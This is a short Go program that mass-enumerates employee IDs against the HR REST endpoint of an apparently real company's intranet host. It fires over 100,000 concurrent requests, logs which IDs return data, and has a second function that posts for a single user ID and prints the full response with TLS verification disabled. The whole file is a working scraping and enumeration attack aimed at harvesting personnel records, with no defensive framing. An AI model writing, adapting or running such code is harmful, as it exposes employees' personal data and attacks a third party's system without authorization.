package algorithm

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
)

// 最大并发数控制
const maxConcurrency = 50

// 请求函数
func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}) {
	defer wg.Done()

	// 控制并发数量
	sem <- struct{}{}
	defer func() { <-sem }()

	// 发起 GET 请求并设置超时
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("[!] 请求失败: %s - %s\n", url, err)
		return
	}
	defer resp.Body.Close()

	// 检查状态码并处理响应
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && len(body) > 100 {
		fmt.Printf("[+] 有效 URL: %s\n", url)
	}
}

func IworkGet() error {
	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrency) // 控制最大并发数

	// 扫描范围1: NF0000 - NF4000
	for i := 0; i <= 4000; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/NF%04d", i)
		wg.Add(1)
		go fetchURL(&wg, url, sem)
	}

	// 扫描范围2: N00000 - N99999
	for i := 0; i <= 99999; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
		wg.Add(1)
		go fetchURL(&wg, url, sem)
	}

	wg.Wait() // 等待所有 goroutine 完成
	fmt.Println("[*] 扫描完成")
	return nil
}

func IworkSent(user string) error {

	// Define the request URL
	url := "https://it.ofilm.com/hr/hr-ks//rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/" + user

	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)

	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return nil
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return nil
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return nil
	}

	// Print the response status and body
	fmt.Printf("Status Code: %d\n", resp.StatusCode)
	fmt.Printf("Response Body: %s\n", body)
	return nil
}
